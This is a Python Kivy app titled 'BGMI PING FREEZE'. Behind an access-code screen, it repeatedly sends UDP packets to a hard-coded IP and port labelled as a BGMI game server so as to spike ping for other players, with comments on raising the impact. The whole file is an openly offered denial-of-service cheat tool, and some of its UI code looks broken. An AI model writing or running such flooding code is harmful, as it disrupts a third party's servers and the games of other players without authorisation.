import socket
import time
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.anchorlayout import AnchorLayout

# --- CONFIGURATION ---
SERVER_IP = "103.142.250.10"  # BGMI Server IP (Change if needed)
SERVER_PORT = 9000            # BGMI Server Port
ACCESS_CODE = "BGMI2024"      # Your Secret Key to start

class BGMIAttackApp(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.is_attacking = False
        self.thread = None
        self.ip = SERVER_IP
        self.port = SERVER_PORT

    def send_ping_flood(self):
        """Background thread that sends UDP packets to spike ping"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.is_attacking:
            try:
                # Send a small packet. 
                # To increase ping more, you can send larger data or faster rate.
                sock.sendto(b"\x00\x01\x02", (self.ip, self.port))
                time.sleep(0.05)  # Speed of attack (lower = higher impact but more battery)
            except:
                pass
        sock.close()

    def toggle_attack(self):
        """Start or Stop the attack when floating icon is clicked"""
        if not self.is_attacking:
            self.is_attacking = True
            self.thread = threading.Thread(target=self.send_ping_flood, daemon=True)
            self.thread.start()
            print("[+] Attack Started")
        else:
            self.is_attacking = False
            print("[-] Attack Stopped")

    def build(self):
        # 1. LOGIN SCREEN
        self.login_layout = BoxLayout(orientation='vertical', padding=20)
        
        self.code_input = TextInput(hint_text="Enter Access Code", multiline=False, font_size=24)
        self.start_btn = Button(text="START HACK", size_hint=(1, 0.3), background_color=(0.5, 0.1, 0.1, 1))
        
        self.start_btn.bind(on_press=self.check_code)
        self.login_layout.add_widget(Label(text="BGMI PING FREEZE", font_size=20))
        self.login_layout.add_widget(self.code_input)
        self.login_layout.add_widget(self.start_btn)

        return self.login_layout

    def check_code(self, instance):
        if self.code_input.text == ACCESS_CODE:
            # Remove Login Screen
            self.root.remove_widget(self.login_layout)
            
            # 2. FLOATING ICON (Mode Menu)
            # We create a small button that stays on top
            self.float_icon = Button(text="⚡", size_hint=(None, None), size=(60, 60))
            self.float_icon.bind(on_press=self.toggle_attack)
            
            # Add to Window so it floats above BGMI
            Window.add_widget(self.float_icon)
            
            # Show initial status
            Label(text="Tap Icon to Toggle", font_size=14).bind(pos=self.update_label_pos)
        else:
            self.code_input.text = ""
            self.code_input.hint_text = "Wrong Code!"

    def update_label_pos(self, *args):
        # Keep label near the icon (Optional visual aid)
        pass

if __name__ == '__main__':
    BGMIAttackApp().run()